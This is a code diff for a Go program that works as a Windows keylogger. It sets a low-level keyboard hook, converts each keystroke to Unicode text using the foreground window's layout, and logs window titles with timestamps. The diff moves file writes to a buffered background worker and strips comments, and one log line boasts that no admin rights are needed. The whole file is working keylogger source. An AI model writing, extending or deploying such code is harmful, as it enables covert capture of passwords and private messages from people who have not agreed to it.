@@ -57,23 +57,46 @@ type HHOOK uintptr
 
 // --- Core Logic ---
 
+var (
+	keyChan = make(chan string, 1024)
+)
+
+func logWorker() {
+	var buffer string
+	ticker := time.NewTicker(5 * time.Second)
+	defer ticker.Stop()
+
+	for {
+		select {
+		case data := <-keyChan:
+			buffer += data
+			if len(buffer) > 1024 {
+				flushBuffer(&buffer)
+			}
+		case <-ticker.C:
+			if len(buffer) > 0 {
+				flushBuffer(&buffer)
+			}
+		}
+	}
+}
+
+func flushBuffer(buf *string) {
+	f, err := os.OpenFile(config.KeylogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err == nil {
+		f.WriteString(*buf)
+		f.Close()
+	}
+	*buf = ""
+}
+
 // InitKeyboard starts the event-driven keylogger
 func InitKeyboard() {
-	// Open file in Append mode
-	f, err := os.OpenFile(config.KeylogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		log.Printf("[Keylog] Error opening file: %v", err)
-		return
-	}
-	f.Close() // Close immediately, we open/close on write or keep it open depending on strategy.
-	// For robustness, we will open inside the processing or use a channel.
-	// To keep it simple and crash-proof, we'll write per key stroke.
+	go logWorker() // Start async file writer
 
 	log.Println("[Keylog] Starting Hook (No Admin Required for User Apps)...")
 
 	// 1. Set the Hook
-	// We pass 0 as module handle because usually for WH_KEYBOARD_LL logic,
-	// GetModuleHandle(0) is sufficient in Go runtime.
 	hook, _, err := procSetWindowsHookExA.Call(
 		uintptr(WH_KEYBOARD_LL),
 		syscall.NewCallback(lowLevelKeyboardProc),
@@ -97,15 +120,11 @@ func InitKeyboard() {
 		Pt      struct{ X, Y int32 }
 	}
 
-	// This loop blocks and waits for OS messages. It consumes almost 0 CPU.
 	for {
 		ret, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
 		if ret == 0 {
 			break
 		}
-		// Dispatch message (not strictly needed for just hooking, but good practice)
-		// procTranslateMessage.Call(...)
-		// procDispatchMessage.Call(...)
 	}
 
 	// 3. Cleanup
@@ -114,48 +133,30 @@ func InitKeyboard() {
 
 // lowLevelKeyboardProc is the callback triggered by Windows for EVERY key press
 func lowLevelKeyboardProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
-	// nCode >= 0 means we should process it.
-	// wParam tells us if it's a KeyDown event.
 	if nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
 		kbd := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
-
-		// Process the key asynchronously to avoid blocking the input chain
-		// (Though simple file writing is fast enough usually)
 		handleKey(kbd.VkCode, kbd.ScanCode)
 	}
-
-	// ALWAYS pass the event to the next hook, otherwise the keyboard will freeze.
 	ret, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
 	return ret
 }
 
 func handleKey(vkCode uint32, scanCode uint32) {
-	// Check active window title to add context
 	checkActiveWindow()
 
-	// 1. Prepare Keyboard State (256 bytes)
-	// This fixes the Shift/Caps/AltGr issues. We manually build the state.
 	var state [256]byte
-
-	// Helper to set state bit if key is down/toggled
 	setKey := func(vk int) {
 		s, _, _ := procGetKeyState.Call(uintptr(vk))
-		// High-order bit = Key is Down, Low-order bit = Toggled (CapsLock)
 		state[vk] = byte(s)
 	}
 
-	// Capture state of modifier keys
 	setKey(0x10) // VK_SHIFT
 	setKey(0x11) // VK_CONTROL
 	setKey(0x12) // VK_MENU (Alt)
 	setKey(0x14) // VK_CAPITAL (CapsLock)
 	setKey(0xA5) // VK_RMENU (AltGr - Right Alt)
 
-	// 2. Convert to Unicode
 	var buffer [2]uint16
-
-	// Get keyboard layout of the current foreground thread for accurate mapping
-	// (e.g. if user is in a Turkish window vs English window)
 	hwnd, _, _ := procGetForegroundWindow.Call()
 	pid, _, _ := procGetWindowThreadProcessId.Call(hwnd, 0)
 	layout, _, _ := procGetKeyboardLayout.Call(pid)
@@ -165,42 +166,23 @@ func handleKey(vkCode uint32, scanCode uint32) {
 		uintptr(scanCode),
 		uintptr(unsafe.Pointer(&state[0])),
 		uintptr(unsafe.Pointer(&buffer[0])),
-		uintptr(2), // Buffer size
-		uintptr(0), // Flags
-		layout,     // Keyboard Layout (Important for Turkish chars)
+		uintptr(2), 
+		uintptr(0), 
+		layout,     
 	)
 
-	// 3. Log Logic
-	f, err := os.OpenFile(config.KeylogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		return
-	}
-	defer f.Close()
-
 	if ret > 0 {
-		// Visible Character
 		char := syscall.UTF16ToString(buffer[:ret])
-		// Replace common control chars with readable tags
 		switch vkCode {
-		case 0x0D: // Enter
-			f.WriteString("\n")
-		case 0x08: // Backspace
-			f.WriteString("[BS]")
-		case 0x09: // Tab
-			f.WriteString("[TAB]")
+		case 0x0D: 
+			keyChan <- "\n"
+		case 0x08: 
+			keyChan <- "[BS]"
+		case 0x09: 
+			keyChan <- "[TAB]"
 		default:
-			f.WriteString(char)
+			keyChan <- char
 		}
-	} else {
-		// Non-printable keys (optional, can be commented out to save space)
-		/*
-			switch vkCode {
-			case 0x20: f.WriteString(" ")
-			case 0x25: f.WriteString("[LEFT]")
-			case 0x27: f.WriteString("[RIGHT]")
-			// ... add more if needed
-			}
-		*/
 	}
 }
 
@@ -219,13 +201,8 @@ func checkActiveWindow() {
 		title := syscall.UTF16ToString(buf[:len])
 		if title != lastWindow {
 			lastWindow = title
-
-			f, err := os.OpenFile(config.KeylogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-			if err == nil {
-				timestamp := time.Now().Format("2006-01-02 15:04:05")
-				f.WriteString(fmt.Sprintf("\n\n--- [%s] %s ---\n", timestamp, title))
-				f.Close()
-			}
+			timestamp := time.Now().Format("2006-01-02 15:04:05")
+			keyChan <- fmt.Sprintf("\n\n--- [%s] %s ---\n", timestamp, title)
 		}
 	}
 }
